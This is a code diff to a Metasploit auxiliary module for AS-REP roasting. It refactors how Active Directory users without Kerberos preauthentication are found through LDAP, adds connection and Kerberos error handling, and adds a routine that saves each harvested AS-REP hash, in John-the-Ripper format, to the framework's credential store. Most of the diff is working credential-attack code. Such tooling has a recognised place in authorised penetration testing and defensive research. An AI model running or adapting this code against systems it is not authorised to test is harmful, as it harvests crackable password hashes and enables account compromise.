@@ -58,11 +58,6 @@ class MetasploitModule < Msf::Auxiliary
         OptEnum.new('LDAP::Auth', [true, 'The Authentication mechanism to use', Msf::Exploit::Remote::AuthOption::NTLM, Msf::Exploit::Remote::AuthOption::LDAP_OPTIONS]),
       ]
     )
-
-    default_config_file_path = File.join(::Msf::Config.data_directory, 'auxiliary', 'gather', 'ldap_query', 'ldap_queries_default.yaml')
-    loaded_queries = safe_load_queries(default_config_file_path) || []
-    asrep_roast_query = loaded_queries.select { |entry| entry['action'] == 'ENUM_USER_ASREP_ROASTABLE' }
-    self.ldap_query = asrep_roast_query[0]
   end
 
   def run
@@ -72,6 +67,14 @@ class MetasploitModule < Msf::Auxiliary
     when 'LDAP'
       run_ldap
     end
+  rescue Errno::ECONNRESET
+    fail_with(Failure::Disconnected, 'The connection was reset.')
+  rescue Rex::ConnectionError => e
+    fail_with(Failure::Unreachable, e.message)
+  rescue Rex::Proto::Kerberos::Model::Error::KerberosError => e
+    fail_with(Failure::NoAccess, e.message)
+  rescue Net::LDAP::Error => e
+    fail_with(Failure::Unknown, "#{e.class}: #{e.message}")
   end
 
   def run_brute
@@ -111,37 +114,12 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run_ldap
-    fail_with(Msf::Module::Failure::BadConfig, 'Must provide a username for connecting to LDAP') if datastore['LDAPUsername'].blank?
-
-    ldap_connect do |ldap|
-      validate_bind_success!(ldap)
-      unless (base_dn = ldap.base_dn)
-        fail_with(Failure::UnexpectedReply, "Couldn't discover base DN!")
-      end
-
-      schema_dn = ldap.schema_dn
-      filter_string = ldap_query['filter']
-      attributes = ldap_query['attributes']
+    run_builtin_ldap_query('ENUM_USER_ASREP_ROASTABLE') do |result|
+      username = result.samaccountname[0]
       begin
-        filter = Net::LDAP::Filter.construct(filter_string)
-      rescue StandardError => e
-        fail_with(Failure::BadConfig, "Could not compile the filter #{filter_string}. Error was #{e}")
-      end
-
-      print_line
-      result_count = perform_ldap_query_streaming(ldap, filter, attributes, base_dn, schema_dn) do |result, _attribute_properties|
-        username = result.samaccountname[0]
-        begin
-          roast(username)
-        rescue ::Rex::Proto::Kerberos::Model::Error::KerberosError => e
-          print_error("#{username} reported as ASREP-roastable, but received error when attempting to retrieve TGT (#{e})")
-        end
-      end
-      if result_count == 0
-        print_error("No entries could be found for #{filter_string}!")
-      else
-        print_line
-        print_good("Query returned #{result_count} #{'result'.pluralize(result_count)}.")
+        roast(username)
+      rescue ::Rex::Proto::Kerberos::Model::Error::KerberosError => e
+        print_error("#{username} reported as ASREP-roastable, but received error when attempting to retrieve TGT (#{e})")
       end
     end
   end
@@ -157,6 +135,34 @@ class MetasploitModule < Msf::Auxiliary
     )
     hash = format_as_rep_to_john_hash(res.as_rep)
     print_line(hash)
+    jtr_format = Metasploit::Framework::Hashes.identify_hash(hash)
+    report_hash(hash, jtr_format)
+  end
+
+  def report_hash(hash, jtr_format)
+    service_data = {
+      address: rhost,
+      port: rport,
+      service_name: 'Kerberos',
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+    credential_data = {
+      module_fullname: fullname,
+      origin_type: :service,
+      private_data: hash,
+      private_type: :nonreplayable_hash,
+      jtr_format: jtr_format
+    }.merge(service_data)
+
+    credential_core = create_credential(credential_data)
+
+    login_data = {
+      core: credential_core,
+      status: Metasploit::Model::Login::Status::UNTRIED
+    }.merge(service_data)
+
+    create_credential_login(login_data)
   end
 
   def etypes
